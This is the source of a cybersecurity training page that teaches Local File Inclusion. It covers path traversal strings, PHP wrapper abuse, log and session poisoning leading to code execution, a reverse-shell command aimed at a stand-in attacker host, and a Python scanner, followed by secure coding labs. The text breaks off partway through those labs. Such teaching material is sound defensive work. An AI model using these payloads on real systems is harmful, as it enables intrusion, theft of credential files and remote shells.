<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Local File Inclusion (LFI) vulnerabilities - Understanding path traversal, file inclusion attacks, and implementing robust defenses. Complete cybersecurity training module.">
  <title>Local File Inclusion (LFI) - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/lfi-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Local File Inclusion (LFI)</h1>
        <p class="page-subtitle">
          Master Local File Inclusion vulnerabilities - Learn how attackers exploit dynamic file inclusion to read
          sensitive system files, execute code via log poisoning, and achieve Remote Code Execution (RCE).
          Understand path traversal mechanics and robust defense strategies.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is LFI?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Local File Inclusion (LFI)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Local File Inclusion (LFI) is a web vulnerability that allows an attacker to
          include files from the local server filesystem through exploiting dynamic file inclusion mechanisms. When
          applications use user-controlled input to build file paths without proper validation, attackers can traverse
          the directory structure to access sensitive files or execute arbitrary code through file inclusion functions.
        </div>

        <p class="text-content">
          LFI vulnerabilities arise when applications dynamically include files based on user input. Unlike Remote File
          Inclusion (RFI), LFI targets files already present on the server. However, LFI can often be escalated to RCE
          through techniques like log poisoning, procfs abuse, or by including files containing attacker-controlled
          content (e.g., uploaded images, session files, or log entries).
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> LFI can lead to complete source code disclosure, exposure of
          configuration
          files containing credentials, session hijacking via session file reading, Remote Code Execution through log
          poisoning or PHP wrappers, and system compromise via sensitive file extraction (SSH keys, database configs,
          application secrets).
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 7.5 - 10.0 (High to Critical)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low to Medium (depends on file inclusion context)</li>
            <li><strong>Privileges Required:</strong> None to Low (often unauthenticated)</li>
            <li><strong>User Interaction:</strong> None (direct parameter manipulation)</li>
            <li><strong>Scope:</strong> Changed (can access filesystem beyond application directory)</li>
            <li><strong>Impact:</strong> High on Confidentiality, potential Integrity/Availability impact via RCE</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of File Inclusion</h3>
        <p class="text-content">
          File inclusion vulnerabilities exist on a spectrum from local to remote, with varying degrees of impact:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Description</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Basic LFI</td>
              <td style="padding: 0.75rem;">Read local files via path traversal</td>
              <td style="padding: 0.75rem;">Information disclosure</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">LFI to RCE</td>
              <td style="padding: 0.75rem;">Include attacker-controlled files</td>
              <td style="padding: 0.75rem;">Remote Code Execution</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">RFI</td>
              <td style="padding: 0.75rem;">Include remote files via URL</td>
              <td style="padding: 0.75rem;">Direct RCE (if allow_url_include=On)</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">PHP Wrapper Abuse</td>
              <td style="padding: 0.75rem;">Exploit php:// filters and data://</td>
              <td style="padding: 0.75rem;">Source disclosure, RCE</td>
            </tr>
          </table>
        </div>

        <h3 class="subsection-title">High-Value Target Files</h3>
        <div class="file-target-grid">
          <div class="file-target-card danger">
            <div class="target-path">/etc/passwd</div>
            <div class="target-desc">User account information</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/etc/shadow</div>
            <div class="target-desc">Password hashes (requires root)</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/proc/self/environ</div>
            <div class="target-desc">Environment variables & RCE vector</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/var/log/apache2/access.log</div>
            <div class="target-desc">Log poisoning target</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/var/www/html/config.php</div>
            <div class="target-desc">Application credentials</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/proc/self/fd/X</div>
            <div class="target-desc">File descriptor exploitation</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">/var/lib/php/sessions/</div>
            <div class="target-desc">Session file poisoning</div>
          </div>
          <div class="file-target-card danger">
            <div class="target-path">.ssh/id_rsa</div>
            <div class="target-desc">SSH private keys</div>
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 LFI Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Vulnerable Include → Path Traversal → /etc/passwd or RCE via Log Poisoning]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How LFI Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">Dynamic File Inclusion in PHP</h3>
        <p class="text-content">
          PHP provides several functions for including files dynamically. When user input is passed to these functions
          without sanitization, LFI vulnerabilities occur.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Include Functions</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable patterns using various inclusion functions</span>

<span class="code-comment">// include() - Includes and evaluates the specified file</span>
<span class="code-keyword">include</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'page'</span>] . <span class="code-string">'.php'</span>);

<span class="code-comment">// require() - Same as include but throws fatal error on failure</span>
<span class="code-keyword">require</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'module'</span>]);

<span class="code-comment">// include_once() / require_once() - Include only once</span>
<span class="code-keyword">include_once</span>(<span class="code-string">'templates/'</span> . <span class="code-keyword">$_GET</span>[<span class="code-string">'template'</span>]);

<span class="code-comment">// file_get_contents() - Read entire file into string</span>
<span class="code-keyword">echo</span> <span class="code-function">file_get_contents</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'file'</span>]);

<span class="code-comment">// fopen() / fread() - File stream operations</span>
<span class="code-keyword">$fp</span> = <span class="code-function">fopen</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'log'</span>], <span class="code-string">'r'</span>);

<span class="code-comment">// readfile() - Output file directly</span>
<span class="code-function">readfile</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'document'</span>]);

<span class="code-comment">// highlight_file() / show_source() - Display syntax highlighted source</span>
<span class="code-function">highlight_file</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'source'</span>]);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Path Traversal Mechanics</h3>
        <p class="text-content">
          Path traversal (Directory Traversal) is the core technique behind LFI. By using <code>../</code> sequences,
          attackers navigate up the directory tree to access files outside the intended directory.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Path Traversal Examples</span></div>
          <pre><code><span class="code-comment">-- Basic traversal</span>
<span class="code-string">?page=../../../etc/passwd</span>

<span class="code-comment">-- URL encoded traversal</span>
<span class="code-string">?page=..%2f..%2f..%2fetc%2fpasswd</span>
<span class="code-string">?page=..%252f..%252f..%252fetc%252fpasswd</span>  <span class="code-comment">-- Double encoding</span>

<span class="code-comment">-- Unicode traversal</span>
<span class="code-string">?page=..%c0%af..%c0%af..%c0%afetc/passwd</span>  <span class="code-comment">-- UTF-8 overlong encoding</span>

<span class="code-comment">-- Null byte truncation (PHP < 5.3.4)</span>
<span class="code-string">?page=../../../etc/passwd%00</span>

<span class="code-comment">-- Path normalization bypass</span>
<span class="code-string">?page=....//....//....//etc/passwd</span>
<span class="code-string">?page=..../\..../\..../etc/passwd</span>

<span class="code-comment">-- Expected path + traversal</span>
<span class="code-string">?page=/var/www/html/../../../etc/passwd</span></code></pre>
        </div>

        <h3 class="subsection-title">PHP Wrappers and Protocol Abuse</h3>
        <p class="text-content">
          PHP supports various wrappers that can be abused to read source code, execute code, or bypass filters.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">PHP Wrapper Exploitation</span></div>
          <pre><code><span class="code-comment">-- php://filter - Read source code base64 encoded</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=config.php</span>

<span class="code-comment">-- php://input - Execute raw PHP from POST body</span>
<span class="code-string">?page=php://input</span>
<span class="code-comment">-- POST body: &lt;?php system('id'); ?&gt;</span>

<span class="code-comment">-- data:// - Embed data directly</span>
<span class="code-string">?page=data://text/plain,&lt;?php system('id'); ?&gt;</span>
<span class="code-string">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+</span>

<span class="code-comment">-- expect:// - Execute system commands (requires PECL extension)</span>
<span class="code-string">?page=expect://id</span>
<span class="code-string">?page=expect://ls -la</span>

<span class="code-comment">-- file:// - Absolute path specification</span>
<span class="code-string">?page=file:///etc/passwd</span>
<span class="code-string">?page=file:///var/www/html/config.php</span>

<span class="code-comment">-- zip:// / phar:// - Archive wrapper abuse</span>
<span class="code-string">?page=zip:///var/www/uploads/shell.jpg%23shell.php</span>
<span class="code-string">?page=phar:///var/www/uploads/shell.phar/shell.php</span></code></pre>
        </div>

        <h3 class="subsection-title">LFI to RCE: Log Poisoning</h3>
        <p class="text-content">
          When direct code execution isn't possible, attackers poison log files with PHP code, then include the log
          file via LFI to achieve RCE.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Log Poisoning Techniques</span></div>
          <pre><code><span class="code-comment">-- Step 1: Poison access log with PHP code via User-Agent</span>
<span class="code-string">GET / HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">target.com</span>
<span class="code-attr">User-Agent</span>: <span class="code-string">&lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="code-comment">-- Step 2: Include the access log via LFI</span>
<span class="code-string">?page=../../../var/log/apache2/access.log&cmd=id</span>
<span class="code-string">?page=../../../var/log/nginx/access.log&cmd=whoami</span>
<span class="code-string">?page=../../../var/log/httpd/access_log&cmd=uname -a</span>

<span class="code-comment">-- Alternative: SSH log poisoning</span>
<span class="code-string">ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@target.com</span>
<span class="code-string">?page=../../../var/log/auth.log&cmd=id</span>

<span class="code-comment">-- Alternative: Mail log poisoning</span>
<span class="code-string">telnet target.com 25</span>
<span class="code-string">MAIL FROM: &lt;&lt;?php system($_GET['cmd']); ?&gt;&gt;</span>
<span class="code-string">?page=../../../var/log/mail.log&cmd=id</span>

<span class="code-comment">-- Alternative: Session file poisoning</span>
<span class="code-comment">-- 1. Set PHP session variable to payload</span>
<span class="code-string">Cookie: PHPSESSID=&lt;?php system('id'); ?&gt;</span>
<span class="code-comment">-- 2. Include session file</span>
<span class="code-string">?page=../../../var/lib/php/sessions/sess_[SESSION_ID]</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🔍</div>
            <div class="flow-label">Identify Include</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Find dynamic file inclusion</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">📂</div>
            <div class="flow-label">Traverse Path</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Use ../ sequences</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">📄</div>
            <div class="flow-label">Read Files</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Extract sensitive data</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">☠️</div>
            <div class="flow-label">Poison Logs</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Inject PHP into logs</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💀</div>
            <div class="flow-label">RCE Achieved</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Execute commands</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting LFI</h2>

        <h3 class="subsection-title">Step 1: Identify File Inclusion Points</h3>
        <p class="text-content">
          Map all parameters that control file inclusion or file reading operations.
        </p>

        <div class="highlight-box">
          <strong>Common LFI Parameters:</strong>
          <ul style="margin-left: 2rem;">
            <li><code>page</code>, <code>file</code>, <code>include</code>, <code>require</code></li>
            <li><code>path</code>, <code>folder</code>, <code>dir</code>, <code>document</code></li>
            <li><code>template</code>, <code>view</code>, <code>module</code>, <code>component</code></li>
            <li><code>lang</code>, <code>language</code>, <code>locale</code> (often includes language files)</li>
            <li><code>log</code>, <code>config</code>, <code>source</code>, <code>download</code></li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Basic LFI Detection</h3>
        <p class="text-content">
          Test for LFI by attempting to read known system files and observing error messages or content disclosure.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">LFI Detection Payloads</span></div>
          <pre><code><span class="code-comment">-- Linux systems</span>
<span class="code-string">?page=../../../etc/passwd</span>
<span class="code-string">?page=../../../etc/issue</span>
<span class="code-string">?page=../../../proc/self/environ</span>
<span class="code-string">?page=../../../proc/self/cmdline</span>

<span class="code-comment">-- Windows systems</span>
<span class="code-string">?page=..\..\..\windows\system32\drivers\etc\hosts</span>
<span class="code-string">?page=..\..\..\windows\win.ini</span>
<span class="code-string">?page=..\..\..\windows\system32\config\sam</span>

<span class="code-comment">-- Error-based detection</span>
<span class="code-string">?page=../../../etc/passwd%00</span>  <span class="code-comment">-- Null byte test</span>
<span class="code-string">?page=nonexistent</span>            <span class="code-comment">-- Error message analysis</span>

<span class="code-comment">-- Wrapper detection</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=index.php</span>
<span class="code-string">?page=file:///etc/passwd</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Source Code Disclosure</h3>
        <p class="text-content">
          Use PHP filters to read application source code and discover database credentials, API keys, and other
          vulnerabilities.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Source Code Extraction</span></div>
          <pre><code><span class="code-comment">-- Read config files (base64 encoded to bypass PHP execution)</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=config.php</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=../../config/database.php</span>

<span class="code-comment">-- Decode response:</span>
<span class="code-string">echo 'PD9waHAg...' | base64 -d</span>

<span class="code-comment">-- Chain filters for obfuscation bypass</span>
<span class="code-string">?page=php://filter/read=string.rot13/resource=config.php</span>
<span class="code-string">?page=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=config.php</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode|convert.base64-encode/resource=config.php</span>

<span class="code-comment">-- Read application files to find more inclusion points</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=index.php</span>
<span class="code-string">?page=php://filter/read=convert.base64-encode/resource=functions.php</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: LFI to RCE via Log Poisoning</h3>
        <p class="text-content">
          When file reading is confirmed, escalate to RCE by poisoning log files and including them.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Complete LFI to RCE Exploitation</span></div>
          <pre><code><span class="code-comment">-- Step 1: Determine log location</span>
<span class="code-string">?page=../../../proc/self/fd/15</span>  <span class="code-comment">-- Often points to access log</span>
<span class="code-string">?page=../../../proc/self/environ</span>  <span class="code-comment">-- Check DOCUMENT_ROOT</span>

<span class="code-comment">-- Step 2: Poison User-Agent</span>
<span class="code-string">GET /?page=../../../var/log/apache2/access.log HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">target.com</span>
<span class="code-attr">User-Agent</span>: <span class="code-string">Mozilla/5.0 &lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="code-comment">-- Step 3: Execute command</span>
<span class="code-string">GET /?page=../../../var/log/apache2/access.log&cmd=whoami HTTP/1.1</span>

<span class="code-comment">-- Alternative: Use Burp Intruder to poison logs</span>
<span class="code-comment">-- Payload position in User-Agent header</span>

<span class="code-comment">-- Step 4: Establish reverse shell</span>
<span class="code-string">?page=../../../var/log/apache2/access.log&cmd=nc -e /bin/sh attacker.com 4444</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Automated LFI Scanning</h3>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Automated Tools & Scripts</span></div>
          <pre><code><span class="code-comment">-- Using LFISuite (Python)</span>
<span class="code-string">python lfisuite.py --target "http://target.com/?page="</span>

<span class="code-comment">-- Using Burp Suite LFI Scanner extension</span>
<span class="code-comment">-- 1. Send request to Intruder</span>
<span class="code-comment">-- 2. Mark parameter position</span>
<span class="code-comment">-- 3. Load LFI payload list</span>

<span class="code-comment">-- Custom Python scanner</span>
<span class="code-keyword">import</span> requests
<span class="code-keyword">import</span> base64

<span class="code-attr">TARGET</span> = <span class="code-string">"http://target.com/?page="</span>
<span class="code-attr">PAYLOADS</span> = [
    <span class="code-string">"../../../etc/passwd"</span>,
    <span class="code-string">"../../../proc/self/environ"</span>,
    <span class="code-string">"php://filter/read=convert.base64-encode/resource=config.php"</span>
]

<span class="code-keyword">for</span> payload <span class="code-keyword">in</span> PAYLOADS:
    url = <span class="code-string">f"{TARGET}{payload}"</span>
    resp = requests.<span class="code-function">get</span>(url, timeout=<span class="code-keyword">10</span>)
    
    <span class="code-keyword">if</span> <span class="code-string">"root:x:"</span> <span class="code-keyword">in</span> resp.text:
        <span class="code-function">print</span>(<span class="code-string">f"[+] LFI confirmed: {payload}"</span>)
    <span class="code-keyword">elif</span> <span class="code-string">"PD9waHA"</span> <span class="code-keyword">in</span> resp.text:  <span class="code-comment">-- base64 of &lt;?php</span>
        <span class="code-function">print</span>(<span class="code-string">f"[+] Source disclosure: {payload}"</span>)
        decoded = base64.<span class="code-function">b64decode</span>(resp.text).<span class="code-function">decode</span>()
        <span class="code-function">print</span>(decoded)</code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: LFI to RCE Exploitation Chain</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete exploitation from LFI detection to reverse shell via log poisoning]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious LFI Breaches</h2>

        <h3 class="subsection-title">Case Study 1: CVE-2021-41773 (Apache Path Traversal)</h3>
        <p class="text-content">
          A path traversal vulnerability in Apache HTTP Server 2.4.49 allowed attackers to map URLs to files outside
          the document root. If CGI scripts were enabled, this led to remote code execution. The vulnerability was
          actively exploited in the wild within hours of disclosure.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Complete server takeover, data exfiltration, cryptocurrency mining campaigns.
          Over 100,000 servers compromised within days. CVSS 9.8/10 Critical.
        </div>

        <h3 class="subsection-title">Case Study 2: Magento LFI to RCE (2019)</h3>
        <p class="text-content">
          Magento e-commerce platform suffered from an LFI vulnerability in the CMS module. Attackers could include
          arbitrary files via the <code>forward</code> parameter, leading to remote code execution through log file
          poisoning.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> LFI in CMS forward action → Include /proc/self/environ → Extract database
          credentials from env vars → Direct database access → Complete e-commerce compromise including customer
          payment data.
        </div>

        <h3 class="subsection-title">Case Study 3: Cisco ASA LFI (CVE-2020-3452)</h3>
        <p class="text-content">
          Cisco Adaptive Security Appliance and Firepower Threat Defense contained an LFI vulnerability in the
          web services interface. Unauthenticated attackers could read sensitive files from the system.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Exposure of VPN credentials, session cookies, and configuration files. Allowed
          attackers to bypass authentication and establish VPN connections to corporate networks. Massive enterprise
          impact due to Cisco's market dominance.
        </div>

        <h3 class="subsection-title">Case Study 4: WordPress Theme/Plugin LFI Epidemic</h3>
        <p class="text-content">
          Numerous WordPress themes and plugins have historically suffered from LFI vulnerabilities due to unsafe
          include() calls in template loaders. The TimThumb plugin vulnerability (though primarily file upload)
          demonstrated how file inclusion can chain with other vulnerabilities.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Mass website compromises, SEO spam campaigns, cryptocurrency miners, defacement.
          WordPress's market share (40%+ of websites) makes these vulnerabilities particularly impactful.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">LFI Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Web Hosting</td>
              <td style="padding: 0.75rem;">Read other tenants' config files</td>
              <td style="padding: 0.75rem;">Cross-account compromise</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Extract payment gateway credentials</td>
              <td style="padding: 0.75rem;">Financial fraud, PCI violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Enterprise</td>
              <td style="padding: 0.75rem;">Read LDAP/AD configuration</td>
              <td style="padding: 0.75rem;">Domain compromise</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cloud/SaaS</td>
              <td style="padding: 0.75rem;">Access instance metadata via procfs</td>
              <td style="padding: 0.75rem;">Cloud credential theft</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Government</td>
              <td style="padding: 0.75rem;">Classified document exposure</td>
              <td style="padding: 0.75rem;">National security impact</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how dynamic file inclusion enables LFI attacks, then implement
          strict allowlist validation, path normalization, and secure coding patterns to prevent directory traversal.
        </div>

        <h3 class="subsection-title">Lab 1: Basic LFI in PHP Include</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Direct use of user input in include() without validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct user input in include</span>
<span class="code-keyword">$page</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'page'</span>];

<span class="code-comment">// DANGEROUS: No validation - includes any file</span>
<span class="code-keyword">include</span>(<span class="code-keyword">$page</span> . <span class="code-string">'.php'</span>);

<span class="code-comment">// Attacker can use:</span>
<span class="code-comment">-- ?page=../../../etc/passwd%00</span>
<span class="code-comment">-- ?page=../../../var/log/apache2/access.log</span>
<span class="code-comment">-- ?page=php://filter/read=convert.base64-encode/resource=config</span>

<span class="code-comment">// Even with extension appended, null byte truncates (PHP < 5.3.4)</span>
<span class="code-comment">-- ?page=../../../etc/passwd%00</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">SecurePageLoader</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedPages</span> = [
        <span class="code-string">'home'</span> => <span class="code-string">'pages/home.php'</span>,
        <span class="code-string">'about'</span> => <span class="code-string">'pages/about.php'</span>,
        <span class="code-string">'contact'</span> => <span class="code-string">'pages/contact.php'</span>,
        <span class="code-string">'products'</span> => <span class="code-string">'pages/products.php'</span>
    ];
    
    <span class="code-keyword">private</span> <span class="code-keyword">$basePath</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">__construct</span>() {
        <span class="code-keyword">$this</span>-><span class="code-attr">basePath</span> = <span class="code-function">realpath</span>(<span class="code-function">dirname</span>(<span class="code-keyword">__FILE__</span>) . <span class="code-string">'/../'</span>);
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">loadPage</span>(<span class="code-keyword">$pageName</span>) {
        <span class="code-comment">// Strict allowlist validation</span>
        <span class="code-keyword">if</span> (!<span class="code-function">array_key_exists</span>(<span class="code-keyword">$pageName</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedPages</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Page not found"</span>);
        }
        
        <span class="code-comment">// Build absolute path and verify it's within allowed directory</span>
        <span class="code-keyword">$filePath</span> = <span class="code-keyword">$this</span>-><span class="code-attr">basePath</span> . <span class="code-string">'/'</span> . <span class="code-keyword">$this</span>-><span class="code-attr">allowedPages</span>[<span class="code-keyword">$pageName</span>];
        <span class="code-keyword">$realPath</span> = <span class="code-function">realpath</span>(<span class="code-keyword">$filePath</span>);
        
        <span class="code-keyword">if</span> (<span class="code-keyword">$realPath</span> === <span class="code-keyword">false</span>) {
